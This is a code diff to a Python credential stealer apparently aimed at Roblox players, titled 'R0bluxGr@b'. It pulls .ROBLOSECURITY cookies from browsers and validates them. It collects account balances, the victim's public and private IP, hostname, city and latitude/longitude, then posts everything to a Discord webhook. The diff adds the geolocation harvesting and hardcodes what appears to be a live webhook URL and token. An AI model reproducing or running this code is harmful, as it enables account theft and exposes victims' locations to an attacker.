@@ -1,14 +1,11 @@
-try:
-    import robloxpy, requests, browser_cookie3
-except Exception as e:
-    print(str(e)[16:].replace("'", "") + ' is not installed, run install.bat first.'), exit()
+import robloxpy, requests, browser_cookie3, socket
 
 
-# noinspection PyBroadException
 class SMTHGRB:
     def __init__(self, webhook: str):
         if not "discord.com/api/webhooks/" in webhook:
-            print('You did not provide a webhook on Line 187.'), exit()
+            print('You did not provide a webhook on Line 187.')
+            exit()
 
         self.webhook = webhook
         self.cookie = None
@@ -22,24 +19,29 @@ class SMTHGRB:
             return requests.post(url=self.webhook, data={
                 'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})
 
-        for embed in self.embeds:
-            if self.cookie in embed['description']:
-                return
-
+        # The following part should be outside the checker function
         user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
         id = user['UserID']
         try:
             ip = requests.get('https://api.ipify.org/').text
         except:
-            ## It could not get any connection, so we just do a "N/A" Value
             ip = "N/A"
 
-            # Here you can modify the message that will be sent
+        response = requests.get(f"http://ip-api.com/json/{ip}").json()
+        city = response['city']
+        region_name = response['regionName']
+        country = response['country']
+        latitude = response['lat']
+        longitude = response['lon']
+        # Here you can modify the message that will be sent
+
+        hostname = socket.gethostname()
+        ip_address = socket.gethostbyname(hostname)
 
         self.embeds.append(
             {
                 "title": f"✔ Valid Account - {self.platform}",
-                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n IP Address: ||**{ip}**|| \n"
+                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfos\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
                                f"\n See the cookie at the other message !",
                 "color": 12452044,
                 "footer": {
@@ -47,7 +49,6 @@ class SMTHGRB:
                 }
             }
         )
-
 
         self.embeds.append(
             {
@@ -170,7 +171,7 @@ class SMTHGRB:
 
             "username": "R0bluxGr@b",
             "content": "@everyone",  # You can change this to be just no ping or a @here ping.
-            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024" # You can change the avatar if you are advanced in python.
+            "avatar_url": "https://cdn.discordapp.com/avatars/924130884452511845/1d8a7d3f6bfe5bf654529724a3519d08?size=1024"  # You can change the avatar if you are advanced in python.
                           "/latest?cb=20190801142211&path-prefix=fr"
                           ".png?size=1024",
             "embeds": self.embeds,
@@ -178,6 +179,5 @@ class SMTHGRB:
         })
 
 
-
-
-SMTHGRB("PUT YOUR WEBHOOK URL IN THE QUOTE")
+SMTHGRB(
+    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
